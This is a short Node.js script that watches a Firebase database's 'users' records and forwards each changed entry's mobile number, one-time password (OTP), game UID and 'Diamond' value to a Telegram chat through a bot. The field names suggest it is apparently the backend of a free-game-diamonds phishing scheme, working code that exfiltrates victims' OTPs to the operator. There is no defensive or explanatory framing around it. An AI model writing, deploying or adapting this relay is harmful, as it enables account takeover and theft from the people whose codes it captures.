import admin from "firebase-admin";
import TelegramBot from "node-telegram-bot-api";
import fs from "fs";

// Firebase service account
import serviceAccount from "./serviceAccountKey.json" assert { type: "json" };

// Telegram credentials from Render environment variables
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Initialize Firebase
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: "https://siyamhasansiyam-2c149-default-rtdb.firebaseio.com"
});

const db = admin.database();
const bot = new TelegramBot(BOT_TOKEN);

// Firebase path to listen
const usersRef = db.ref("users");

// Listen for new data
usersRef.on("child_changed", (snapshot) => {
  const userId = snapshot.key;
  const data = snapshot.val();
  let message = `User: ${userId}\n`;

  if(data.NUMBERC) message += `Mobile: ${data.NUMBERC}\n`;
  if(data.OTPC) message += `OTP: ${data.OTPC}\n`;
  if(data.UIDC) message += `UID: ${data.UIDC}\n`;
  if(data.DIAMONDC) message += `Diamond: ${data.DIAMONDC}`;

  bot.sendMessage(CHAT_ID, message)
    .then(() => console.log("Message sent:", message))
    .catch(err => console.error("Telegram error:", err));
});

console.log("Firebase → Telegram listener running...");
